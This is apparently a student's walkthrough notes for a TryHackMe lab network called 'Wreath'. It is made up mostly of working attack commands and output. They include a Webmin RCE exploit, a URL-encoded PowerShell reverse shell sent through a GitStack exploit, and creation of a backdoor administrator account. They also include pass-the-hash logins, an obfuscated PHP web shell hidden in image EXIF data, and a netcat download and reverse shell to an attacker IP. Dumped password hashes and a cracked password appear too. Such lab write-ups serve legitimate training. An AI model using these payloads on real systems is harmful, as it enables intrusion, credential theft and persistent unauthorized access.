# Wreath 

> VOiD | Friday 22 October 2021 11:07:38 PM IST

My IP : 10.50.178.67

# Brief

Brief


Thomas has sent over the following information about the network:

There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.

From this we can take away the following pieces of information:

    There are three machines on the network
    There is at least one public facing webserver
    There is a self-hosted git server somewhere on the network
    The git server is internal, so Thomas may have pushed sensitive information into it
    There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
    By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
    The (assumed) Windows PC cannot be accessed directly from the webserver



# Target 1 [10.200.185.200]

## PORT 80 [Apache httpd 2.4.37]

OS : centos

We can’t connect to the server at thomaswreath.thm
So we add it to our /etc/hosts

Here we have a simple website like portfolio

## PORT 10000 [MiniServ/1.890]

This version is old and may have exploits

CVE- 2019-15107 : Webmin 1.920 - Unauthenticated Remote Code Execution

```bash

python3 webmin-1.890_exploit.py 10.200.185.200 10000 "cat /root/.ssh/id_rsa"
```

## PORT 22 [ssh]
```bash
cat /etc/shadow
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
```

```bash
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

```



## PORT 22 [SSH]
```bash
ssh -i id_rsa_tar1_root root@10.200.185.200

./nmap -sn 10.200.185
.200/24 -oN scan_nmap_hosts
Nmap scan report for ip-10-200-185
-1.eu-west-1.compute.internal (10.200.185
.1)
Nmap scan report for ip-10-200-185
-100.eu-west-1.compute.internal (10.200.185
.100)
Nmap scan report for ip-10-200-185
-150.eu-west-1.compute.internal (10.200.185.150
)
Nmap scan report for ip-10-200-185
-250.eu-west-1.compute.internal (10.200.185
.250)
Nmap scan report for ip-10-200-185
-200.eu-west-1.compute.internal (10.200.185
.200)

REAL HOSTS : 10.200.185
.100, 10.200.185.150


not filtered 10.200.185.150


./nmap -vv 10.200.185.150

Discovered open port 3389/tcp on 10.200.185.150

Discovered open port 80/tcp on 10.200.185.150

Discovered open port 5985/tcp on 10.200.185.150


PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
MAC Address: 02:9F:F7:DC:6B:2B (Unknown)

ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
ssh -i id_rsa_tar1_root root@10.200.185
.200 -L 80:10.200.185.150:80
:80 -fN
```



## PORT 80[port forward 10.200.185.150
]
http://localhost/registration/login/
Running GitStack
```bash
searchsploit gitstack
GitStack 2.3.10 - Remote Code Execution            | php/webapps/43777.py
GitStack - Remote Code Execution                   | php/webapps/44044.md

```
```bash
\curl -X POST http://localhost/web/exploit.php  -d "a=whoami"
"nt authority\system"

curl -X POST http://localhost/web/exploit.php  -d "a=hostname"
"git-serv"

```

Lets get a reverse shell

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:
firewall-cmd --zone=public --add-port PORT/tcp

```bash
firewall-cmd --zone=public --add-port 4444/tcp

curl -X POST http://localhost/web/exploit.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.185.200%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

```bash
We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use anywhere else.

First we create the account itself:
net user USERNAME PASSWORD /add
net user void helloworld /add


Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:
net localgroup Administrators USERNAME /add
net localgroup Administrators void /add

net localgroup "Remote Management Users" USERNAME /add
net localgroup "Remote Management Users" void /add


ssh -i id_rsa_tar1_root root@10.200.185.200 -L 58950:10.200.185.150:58950

sshuttle -r root@10.200.185.200 --ssh-cmd "ssh -i id_rsa_tar1_root" 10.200.185.200/24 -x 10.200.185.200 

it uses ssh to create a vpn
-x is for excluding the target ip to include in the subnet

evil-winrm -u void -p helloworld -i 10.200.185.150

xfreerdp /v:10.200.185.150 /u:void /p:helloworld +clipboard /dynamic-resolution /drive:./,share


Administrators:
37db630168e5f82aafa8461e05c6bbd1

Thomas:
02d90eda8f6b6b06c32d5f207831101f - i<3ruby - Possible algorithms: NTLM

evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.185.150
                    
use -s folder name to automatically import the scripts in the connection
```

## TARGET 3 10.200.185.100
```bash
Invoke-Portscan -Hosts 10.200.185.100 -TopPorts 50

Hostname      : 10.200.185.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 5900, 993...}
finishTime    : 1/21/2022 12:37:56 PM


*Evil-WinRM* PS C:\Users\Administrator\Documents> upload chisel_1.7.3_windows_amd64


When using this option you will need to open up a port in the Windows firewall to allow the forward connection to be made. The syntax for opening a port using netsh looks something like this:

netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT

Please use the name-USERNAME naming convention -- for example:

netsh advfirewall firewall add rule name="Chisel-Void" dir=in action=allow protocol=tcp localport=47000

First, on the compromised host we would use:
./chisel server -p LISTEN_PORT --socks5
./chisel_void.exe server -p 47000 --socks5


On our own attacking box we would then use:
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
./chisel client 10.200.185.150:47000 9000:socks

Directory: C:\GitStack\repositories\Website.git


thomas:i<3ruby

To add this to our image we once again use exiftool:
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-USERNAME.jpeg.php


irst up, lets build that payload:
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>

<?php $f0=$_GET[base64_decode('d3JlYXRo')];if(isset($f0)){echo base64_decode('PHByZT4=').shell_exec($f0).base64_decode('PC9wcmU+');}die();?>

<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>


exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" catt.jpeg


http://10.200.185.100/resources/uploads/catt.jpeg.php?wreath=whoami
wreath-pc\thomas

curl http://10.50.182.159/nc.exe -o c:\\windows\\temp\\nc.exe

powershell.exe c:\\windows\\temp\\nc.exe 10.50.182.159 4444 -e cmd.exe 

sc qc SystemExplorerHelpService


⛩\> secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```
